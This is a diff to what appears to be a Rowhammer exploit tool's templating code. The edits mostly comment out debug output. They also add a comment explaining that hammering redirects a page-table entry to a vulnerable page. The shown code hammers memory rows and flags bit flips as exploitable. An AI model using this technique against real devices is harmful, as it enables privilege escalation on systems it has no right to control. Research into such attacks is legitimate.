@@ -28,8 +28,6 @@ extern int rowsize;
 
 #define FLIP_DIRECTION_STR(x) (((x) == ONE_TO_ZERO) ? "1-to-0" : "0-to-1")
 
-#define DEBUG
-
 #ifdef DEBUG
 #define dprintf(...) printf(__VA_ARGS__)
 #else
@@ -153,6 +151,8 @@ void handle_flip(uint8_t *virt_row,
     tmpl->rel_row_index = tmpl->rel_address / rowsize;
     tmpl->rel_pfn       = tmpl->rel_address / PAGESIZE;
 
+    // source: the mapped physical page
+    // target: the vulnerable page. After hammering, PTE will point to here rather than source
     tmpl->target_pfn     = tmpl->rel_pfn;
     tmpl->source_pfn     = tmpl->target_pfn ^ (1 << (tmpl->bit_index_in_word - 12));
     tmpl->target_pfn_row = tmpl->target_pfn / PAGES_PER_ROW;
@@ -167,16 +167,16 @@ void handle_flip(uint8_t *virt_row,
     tmpl->found_at = time(NULL);
     
     
-    print("[FLIP] i:%p l:%d/%d v:%p p:%p b:%5d 0x%08x != 0x%08x s:%d",
-                     tmpl->ion_chunk->mapping,
-                     tmpl->rel_address, tmpl->ion_len,
-            (void *) tmpl->virt_addr, 
-            (void *) tmpl->phys_addr, 
-                     tmpl->byte_index_in_row,
-                     tmpl->org_word, 
-                     tmpl->new_word,
-                     tmpl->found_at);
-    printf("\n");
+//    print("[FLIP] i:%p l:%d/%d v:%p p:%p b:%5d 0x%08x != 0x%08x s:%d",
+//                     tmpl->ion_chunk->mapping,
+//                     tmpl->rel_address, tmpl->ion_len,
+//            (void *) tmpl->virt_addr,
+//            (void *) tmpl->phys_addr,
+//                     tmpl->byte_index_in_row,
+//                     tmpl->org_word,
+//                     tmpl->new_word,
+//                     tmpl->found_at);
+//    printf("\n");
    
     tmpl->maybe_exploitable = is_exploitable(tmpl);
     if (global_of) {
@@ -250,7 +250,7 @@ int do_hammer(uint8_t *virt_row,
             if (template_exists(templates, (uintptr_t) virt_row + i, pattern[i], virt_row[i])) continue;
 
             new_flips++;
-            if (new_flips == 1) printf("\n");
+//            if (new_flips == 1) printf("\n");
 
             handle_flip(virt_row, 
                         (uintptr_t *) virt_above, 
@@ -272,7 +272,7 @@ int do_hammer(uint8_t *virt_row,
         }
     }
     if (new_flips > 0)  
-        printf("[TMPL - deltas] virtual row %d: ", (uintptr_t) virt_row / rowsize);
+//        printf("[TMPL - deltas] virtual row %d: ", (uintptr_t) virt_row / rowsize);
 
     return ns_per_read;
 }
@@ -356,7 +356,7 @@ void TMPL_run(std::vector<struct ion_data *> &chunks,
                     flips, exploitable_flips, bytes_hammered, seconds_passed, median_readtime, kb_per_flip, percentage_exploitable, spc_flips, to1, to0);
             print("[TMPL - hammer] virtual row %d: %p | physical row %d: %p\n", 
                     virt_row_index, virt_row, phys_row_index, phys_row);
-            printf("[TMPL - deltas] virtual row %d: ", (uintptr_t) virt_row_index);
+//            printf("[TMPL - deltas] virtual row %d: ", (uintptr_t) virt_row_index);
 
         
             uintptr_t above_row = virt_row - rowsize;
@@ -370,7 +370,7 @@ void TMPL_run(std::vector<struct ion_data *> &chunks,
                 uintptr_t virt_above = above_row + offset;
                 uintptr_t virt_below = below_row + offset;
 
-                printf("|");
+//                printf("|");
                 for (auto pattern: patterns) {
 
                     /* write patterns to the adjacent rows and hammer */
@@ -381,7 +381,7 @@ void TMPL_run(std::vector<struct ion_data *> &chunks,
                                           (volatile uintptr_t *) virt_below, 
                                           pattern->above, pattern->victim, pattern->below, templates, chunk, hammer_readcount);
                     readtimes.push_back(delta);
-                    printf("%d|", delta);
+//                    printf("%d|", delta);
 
                     pattern->cur_use++;
                     if (pattern->max_use && pattern->cur_use >= pattern->max_use) {
@@ -391,7 +391,7 @@ void TMPL_run(std::vector<struct ion_data *> &chunks,
                         pattern->cur_use = 0;
                     }
                 }
-                printf(" ");
+//                printf(" ");
        
                 bytes_hammered += step;
 
@@ -399,7 +399,7 @@ void TMPL_run(std::vector<struct ion_data *> &chunks,
 
                 if (times_up) break;
             }
-            printf("\n");
+//            printf("\n");
                 
             if (times_up) break;
         }
